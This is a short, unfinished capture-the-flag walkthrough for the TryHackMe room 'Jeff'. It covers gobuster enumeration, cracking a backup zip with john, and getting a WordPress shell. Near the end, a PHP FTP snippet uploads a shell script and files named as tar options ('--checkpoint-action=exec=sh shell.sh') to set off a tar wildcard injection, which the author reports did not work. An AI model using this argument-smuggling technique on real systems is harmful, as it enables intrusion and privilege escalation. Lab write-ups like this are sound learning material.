# Jeff **INCOMPLETE**

https://tryhackme.com/room/jeff

jeff.thm is a website with sub dirs. gobuster on /backups with -x zip will find backup.zip
creacking this zip with john (specify file, e.g. wpadmin.bak, as the whole zip isn't encrypted) will reveal the password
the wpadmin.bak contains the password for jeff on the wordppress site
subdomain enum will reveal wordpress.jeff.thm.
wpterm gives a terminal as www-user
under the wordpress install is a ftp-backup.php that reveals the address and creds for an ftp server
there is no client on the box, but with php interactive (need a tty shell) you can upload files to the server:

```
$username = "backupmgr";
$password = "<redacted>";
$ftp = ftp_connect("172.20.0.1");
var_dump(ftp_login($ftp, $username, $password));
var_dump(ftp_pasv($ftp, False));
var_dump(ftp_nlist($ftp, "."));
var_dump(ftp_chdir ($ftp, "files"));
var_dump(ftp_put($ftp, "/files/shell.sh", "shell.sh", FTP_ASCII));
var_dump(ftp_put($ftp, "/files/--checkpoint=1", "empty", FTP_ASCII));
var_dump(ftp_put($ftp, "/files/--checkpoint-action=exec=sh shell.sh", "empty", FTP_ASCII));
var_dump(ftp_nlist($ftp, "files"));
```

Ideally this should trigger a tar wildcard exploit (but it wasn't working for me)
